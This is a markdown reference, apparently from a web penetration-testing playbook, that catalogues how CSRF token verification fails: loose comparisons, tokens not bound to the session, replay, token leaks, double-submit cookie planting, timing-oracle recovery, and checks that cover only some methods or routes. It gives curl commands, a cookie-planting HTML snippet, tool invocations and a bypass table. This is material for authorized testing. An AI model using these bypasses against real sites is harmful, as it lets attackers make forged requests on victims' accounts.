# Token bypass deep — the verification-logic failure corpus

Every way a CSRF token check fails in practice — the comparison
bugs, the binding gaps, and the replay surfaces.

---

## 1. The comparison-logic failures

```python
# == on mismatched types — coercion
if token == request.form['csrf']:          # "0" == 0? a coercion
if token != provided: reject               # ok
if provided in valid_tokens:               # a global set, not session
if provided and provided == stored:        # empty provided skips
if stored is None or provided == stored:   # unset stored = any passes
if len(provided) == len(stored):           # only length checked!
if provided.startswith(stored[:4]):        # prefix-only check
```

```javascript
if (token === req.body.csrf)              // strict — but === ''?
if (token == req.body.csrf)               // loose — coercion
if (req.body.csrf) { if (token===...) }   // absent-field skips!
if (validTokens.includes(req.body.csrf))  // a global set
```

The `absent-field-skips` and the `empty-provided-passes` shapes are
the most common — send no token or an empty one.

## 2. The session-binding failures — a global token

```python
# the token isn't bound to the session
tokens.add(token)                          # a global valid-set —
                                           # any session's token works
token = hmac(secret, 'csrf')               # not session-keyed —
                                           # same token for everyone
token = random()                           # generated once, global
```

A global/static token is a known value — replay it.

## 3. The replay surfaces — a reusable token

```text
- a token valid indefinitely → grab it once, replay forever
- a per-request token that doesn't invalidate the prior → replay
  the previous
- a token bound to the FORM not the session → the form's token
  validates any session's submit
```

```bash
# grab YOUR token
MYTOKEN=$(curl -s -b "$CJ" "$BASE/form" | grep -oE 'value="[a-f0-9]+"' | head -1 | cut -d'"' -f2)
# replay it in the CSRF — does it validate under the victim's session?
```

## 4. The token-source leaks — where the token is readable

```text
the token must be UNREADABLE to the attacker page — the leak surfaces:
- a JSON endpoint /api/csrf-token that's CORS-open → fetch reads it
- a <meta name=csrf-token> → same-origin JS reads it (needs XSS or
  a stored page)
- a non-HttpOnly XSRF cookie → JS reads it (needs same-origin or
  a subdomain)
- a JSONP endpoint that returns it → cross-origin read via JSONP
- the token in a URL → Referer/history leak
- a static/derivable token → guess it
- a token the page-source leaks to a proxy → read via the proxy
```

A CORS-open token endpoint is the cleanest break — the page fetches
the token then uses it in the CSRF.

## 5. The double-submit deep — the cookie-side failures

```text
double-submit: cookie csrf=<T> must equal form csrf=<T>
- no session binding → plant the cookie + match the form (both yours)
- the cookie is settable cross-site (a subdomain, a Set-Cookie
  injection, a cookie-bomb) → control its value
- the comparison reads the WRONG source (header vs body mismatch)
- the cookie isn't validated for format → a same-value-anywhere
```

```html
<!-- plant the cookie via a subdomain -->
<img src="https://sub.t/set-cookie?csrf=x">
<!-- the form's csrf=x matches the planted cookie -->
<form action="/x" method=POST><input name=csrf value=x></form>
```

## 6. The timing-oracle token recovery — a partial check

```text
a token compared char-by-char with an early-exit → the response
time leaks how many chars matched → recover the token one char at
a time. rare but real on a hand-rolled compare.
```

```bash
# time each prefix — a longer match = a correct next char
for c in a b c ...; do
  time curl -X POST "$BASE/x" -d "a=1&csrf=$P$c" -b "$CJ"; done
# the prefix that takes longest is the correct next char
```

## 7. The header-vs-body confusion — the wrong source read

```python
# the check reads the token from a HEADER, the CSRF sends it in the
# body — the header is absent → if absent skips, it opens
if request.headers.get('X-CSRF') == stored:   # absent → != → but if
                                               # the check is
                                               # 'if header and header==stored'
                                               # → absent skips!
```

```text
a check that only fires WHEN the header is present — a body-field
token doesn't populate the header → the check is skipped → the
write goes through unverified.
```

## 8. The method/route-scoped check — a partial coverage

```python
# the token check only on POST, not on PUT/DELETE/PATCH/GET
# the token check only on /api/change, not on /api/update
# the token check only on the 'web' blueprint, not the 'api' one
```

```bash
# does a different METHOD reach the same write?
curl -X PUT "$BASE/x" -d 'a=1' -b "$CJ"      # unguarded method
# does a sibling ROUTE do the same write?
curl -X POST "$BASE/x2" -d 'a=1' -b "$CJ"    # unguarded route
```

## 9. The token-rotation gap — the old-token window

```text
a per-request rotated token that doesn't invalidate the prior →
the PREVIOUS token still validates → replay it. a 'rotate but keep
last N' is a known weakness.
```

## 10. The encrypted/HMAC token — the key-derivation attack

```python
# a token = HMAC(session-id, secret) — if secret is weak/leaked
# or the token is Encrypt(session) with a weak key → brute/forge
# the session_dissect / jwt_forge shape
```

```bash
python3 tools/web/session_dissect.py --token "$TOKEN"   # name the format
python3 tools/web/jwt_forge.py --token "$JWT" ...       # if a JWT
```

## 11. The bypass-decision table

| Check shape | The bypass |
|---|---|
| absent-field skips | send no token |
| empty passes | `csrf=` |
| global/static token | replay yours |
| not session-bound | replay yours under a different session |
| replayable | grab once, replay |
| double-submit | plant cookie + match form |
| CORS-open token endpoint | fetch it cross-origin |
| substring/length check | a value matching the check |
| header-only check | send body-only — header absent skips |
| method/route-scoped | an unguarded method/route |
| timing-oracle | recover char-by-char |
| encrypted/HMAC | session_dissect → forge |

## 12. The falsifier

```text
the token is session-bound, required on every method+route, not
replayable, not readable cross-origin, no double-submit or leak
surface — the token gate holds. the write needs a different
credential-path (a stored page that reads it, an XSS).
```

## 13. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "token-bypass: <shape> -> <the bypass>"
```
